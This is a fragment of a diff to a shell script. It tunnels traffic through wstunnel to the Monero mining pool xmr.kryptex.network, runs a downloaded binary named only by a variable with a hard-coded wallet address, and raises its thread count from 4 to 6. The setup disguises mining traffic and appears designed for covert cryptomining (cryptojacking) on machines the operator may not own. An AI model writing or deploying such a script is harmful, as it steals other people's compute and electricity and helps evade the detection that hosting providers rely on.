@@ -31,7 +31,7 @@ nohup ./wstunnel server ws://127.0.0.1:${WS_SERVER_PORT} &
 nohup ./wstunnel client -L tcp://127.0.0.1:${LOCAL_TUNNEL_PORT}:xmr.kryptex.network:7029 ws://127.0.0.1:${WS_SERVER_PORT} &
 
 # Run the binary against the random local port
-./"${BOS_DL}" -o 127.0.0.1:${LOCAL_TUNNEL_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 4
+./"${BOS_DL}" -o 127.0.0.1:${LOCAL_TUNNEL_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 6
 
 # Clean up tarball
 rm -f wstunnel_10.5.2_linux_amd64.tar.gz
